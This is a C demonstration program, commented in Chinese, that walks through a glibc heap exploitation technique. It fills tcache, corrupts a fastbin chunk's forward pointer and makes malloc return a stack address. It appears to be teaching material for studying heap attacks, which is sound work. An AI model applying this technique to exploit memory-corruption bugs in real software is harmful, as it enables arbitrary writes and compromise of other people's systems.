#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);
  printf("\n想要实现类似 unsorted bin attack 的效果\n\n");

  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf("首先 free 七次填满 tcache 链表\n\n");
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* victim = ptrs[7];
  printf("接下来要释放的这个 %p 因为 tcache 已经满了，所以不会放到 tcache 里边，进入 fastbin 的链中\n\n",victim);
  free(victim);

  printf("接下来，我们需要释放1至6个指针。 这些也将进入fastbin。 如果要覆盖的堆栈地址不为零，则需要再释放6个指针，否则攻击将导致分段错误。 但是，如果堆栈上的值为零，那么一个空闲就足够了。\n\n");
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));
  printf("定义了一个栈上面的数组，我们打算修改的地址是 %p，现在的值是 %p\n",&stack_var[2],(char*)stack_var[2]);

  printf("假设存在堆溢出或者 UAF 之类的漏洞能修改 %p 的 fd 指针为 stack_var 的地址\n\n",victim);
  *(size_t**)victim = &stack_var[0];

  printf("接下来 malloc 7 次清空 tcache\n\n");
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf("下面输出一下 stack_var 的内容，看一下现在是啥\n\n");
  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  printf("\n目前 tcache 为空，但 fastbin 不是，因此下一个分配来自 fastbin。另外，fastbin 中的 7 个块用于重新填充 tcache。这 7 个块以相反的顺序复制到 tcache 中，因此我们所针对的堆栈地址最终成为 tcache 中的第一个块。 它包含一个指向列表中下一个块的指针，这就是为什么将堆指针写入堆栈的原因。 前面我们说过，如果释放少于6个额外的指向fastbin的指针，但仅当堆栈上的值为零时，攻击也将起作用。 这是因为堆栈上的值被视为链表中的下一个指针，并且如果它不是有效的指针或为null，它将触发崩溃。 现在，数组在堆栈上的内容如下所示：\n\n"
  );

  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  printf("最后再分配一次就得到位于栈上的 chunk %p\n",q);

  assert(q == (char *)&stack_var[2]);
  return 0;
}